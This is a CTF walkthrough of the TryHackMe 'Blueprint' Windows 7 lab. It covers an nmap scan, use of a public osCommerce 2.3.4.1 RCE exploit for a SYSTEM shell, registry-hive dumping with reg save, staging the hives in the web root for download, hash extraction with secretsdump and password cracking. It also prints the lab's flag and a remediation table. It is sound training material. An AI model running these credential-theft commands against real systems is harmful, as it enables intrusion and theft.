# Blueprint — Professional CTF Walkthrough

**Target:** Blueprint (VM)  
**Platform:** TryHackMe  
**OS:** Windows 7 Home Basic 7601 Service Pack 1  
**Difficulty:** Easy  
**Date Completed:** 2026-01-31  

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)  
2. [Service Enumeration](#2-service-enumeration)  
3. [Vulnerability Analysis](#3-vulnerability-analysis)  
4. [Initial Exploitation](#4-initial-exploitation)  
5. [Local Enumeration](#5-local-enumeration)  
6. [Privilege Escalation](#6-privilege-escalation)  
7. [Post-Exploitation](#7-post-exploitation)  
8. [Remediation & Hardening](#8-remediation--hardening)  
9. [Appendix: Evidence](#appendix-evidence)  
10. [Conclusion](#conclusion)  

---

## 1) Reconnaissance

The target IP was provided by the platform:

**Target:** `10.81.190.101`  
**Hostname (from SMB discovery):** `BLUEPRINT`  

---

## 2) Service Enumeration

### Comprehensive Port Scan

Full TCP scan with default scripts, service detection, and OS fingerprinting:

```bash
nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 --open -oA full_scan 10.81.190.101
```

**Results Summary:**

| Port | Proto | Service | Version / Details | Notes |
|------|-------|---------|-------------------|-------|
| 80 | tcp | http | Microsoft IIS 7.5 | TRACE enabled; default 404 |
| 135 | tcp | msrpc | Microsoft Windows RPC | RPC endpoint mapper |
| 139 | tcp | netbios-ssn | Microsoft Windows netbios-ssn | SMB/NetBIOS |
| 443 | tcp | ssl/http | Apache 2.4.23 (Win32) OpenSSL 1.0.2h PHP 5.6.28 | Directory listing exposed; TRACE enabled |
| 445 | tcp | microsoft-ds | Windows 7 Home Basic SP1 (WORKGROUP) | SMB signing disabled |
| 3306 | tcp | mysql | MariaDB 10.3.23 or earlier (unauthorized) | Service exposed; auth required |
| 8080 | tcp | http | Apache 2.4.23 (Win32) OpenSSL 1.0.2h PHP 5.6.28 | Directory listing exposed; TRACE enabled |
| 49152-49160 | tcp | unknown/msrpc | Dynamic RPC ports | Typical for Windows services |

**Key Findings:**
- Directory listing on ports **443/8080** exposed `oscommerce-2.3.4/`, including `catalog/` and `docs/`.
- SMB signing was reported as **disabled**.
- HTTP **TRACE** method was enabled on both IIS/Apache.

**Nmap Output (relevant excerpts):**

```text
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Index of /
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT
|   Workgroup: WORKGROUP
|_  System time: 2026-01-31T18:32:27+00:00
```

---

## 3) Vulnerability Analysis

### Attack Surface Review

The directory listing on ports **443/8080** immediately exposed an `oscommerce-2.3.4/` application. Given the known public exploitation history of osCommerce 2.3.4.x, this became the primary attack surface.

**Vulnerability Candidates:**

| Finding | Evidence | Impact | Reference |
|--------|----------|--------|-----------|
| osCommerce 2.3.4.1 Remote Code Execution | `oscommerce-2.3.4/catalog/` reachable on `:8080` | Unauthenticated RCE | Exploit-DB `50128` |
| Directory listing enabled | Nmap `http-ls` on `:443` and `:8080` | Information disclosure; enables targeted exploitation | Misconfiguration |
| Web service running as SYSTEM | Exploit shell context returned SYSTEM | Full host compromise on RCE | Misconfiguration |
| SMB signing disabled | Nmap `smb-security-mode` | Relay/MiTM risk in real environments | Misconfiguration |
| Legacy OS (Windows 7 SP1) | Nmap `smb-os-discovery` | High exposure to known vulns | EOL OS |

**Chosen Attack Vector:** Exploit **osCommerce 2.3.4.1 RCE** on port **8080** to gain code execution on the host.

---

## 4) Initial Exploitation

### Initial Access (osCommerce RCE)

**Vulnerability:** osCommerce 2.3.4.1 - Remote Code Execution (Exploit-DB `50128`)  
**Entry Point:** `http://10.81.190.101:8080/oscommerce-2.3.4/catalog/`  
**Result:** Remote code execution with an interactive shell context as `NT AUTHORITY\\SYSTEM`

**Exploit Command:**
```bash
python3 50128.py http://10.81.190.101:8080/oscommerce-2.3.4/catalog/
```

**Shell Context (proof):**
```text
User: nt authority\system
```

**Basic Interaction:**
```text
RCE_SHELL$ pwd
RCE_SHELL$ dir
```

---

## 5) Local Enumeration

The RCE shell provided access to the web root hosted under XAMPP.

**Working directory observed:**

```text
Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
```

**Notable files:**
- `configure.php` (likely contains application or installation settings)
- `application.php`

At this stage, privileges were already SYSTEM, so the focus shifted to proof collection and credential extraction.

---

## 6) Privilege Escalation

No additional privilege escalation was required because the initial exploit executed as:

```text
NT AUTHORITY\SYSTEM
```

---

## 7) Post-Exploitation

### Credential Extraction (SAM/SYSTEM/SECURITY)

Registry hive saves:

```text
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
reg save HKLM\SECURITY C:\Windows\Temp\security.save
```

Copied hives into a web-accessible directory for download:

```text
copy C:\Windows\Temp\sam.save "C:\xampp\htdocs\oscommerce-2.3.4\docs\sam.save"
copy C:\Windows\Temp\system.save "C:\xampp\htdocs\oscommerce-2.3.4\docs\system.save"
```

On the attacker machine, hashes were extracted using Impacket `secretsdump.py`:

```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

**Extracted SAM hashes (relevant excerpt):**
```text
Administrator:500:...:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:...:30e87bf999828446a1c1209ddde4c450:::
```

**Note:** LSA extraction failed because `security.save` was not present on the attacker side at extraction time.

The `Lab` user password was cracked via CrackStation:

```text
Lab:googleplus
```

### Proof / Flags

**Root Proof Location:** `C:\\Users\\Administrator\\Desktop\\root.txt.txt`

```text
type C:\Users\Administrator\Desktop\root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

---

## 8) Remediation & Hardening

| Vulnerability | Severity | Evidence | Recommendation |
|--------------|----------|----------|----------------|
| osCommerce 2.3.4.1 RCE | Critical | Public exploit used (Exploit-DB `50128`) | Upgrade/patch osCommerce; remove vulnerable components |
| Directory listing enabled | High | `http-ls` on ports 443/8080 | Disable directory listing; restrict access to web root |
| Web service running as SYSTEM | Critical | RCE executed as SYSTEM | Run services under least-privileged service accounts |
| Windows 7 SP1 (EOL) | High | OS discovery via SMB | Upgrade to a supported OS; apply security updates |
| SMB signing disabled | Medium | Nmap SMB scripts | Require SMB signing; disable legacy SMB where possible |
| HTTP TRACE enabled | Low | Nmap `http-methods` | Disable TRACE on IIS/Apache |
| Exposed internal services (3306) | Medium | MariaDB port exposed | Restrict DB to localhost; firewall and network segmentation |

---

## Appendix: Evidence

- [ ] Nmap results (open ports + versions)
- [ ] Directory listing showing `oscommerce-2.3.4/`
- [ ] RCE proof (`NT AUTHORITY\\SYSTEM`)
- [ ] SAM hash extraction (Lab user)
- [ ] Root flag

---

## Conclusion

The target exposed an Apache service with directory listing enabled, revealing an `oscommerce-2.3.4` installation. An osCommerce 2.3.4.1 remote code execution exploit (Exploit-DB 50128) was used against the catalog application on port 8080, which returned a shell context running as `NT AUTHORITY\\SYSTEM`. With SYSTEM-level access, the SAM/SYSTEM hives were dumped and offline hashes were extracted and cracked, and the root proof file was collected from the Administrator desktop.

---

**Author:** Eligof  
**Date:** 2026-01-31  
**Tools Used:** Nmap, Python, Impacket (`secretsdump.py`), CrackStation  
**Methodology:** OSSTMM compliant  

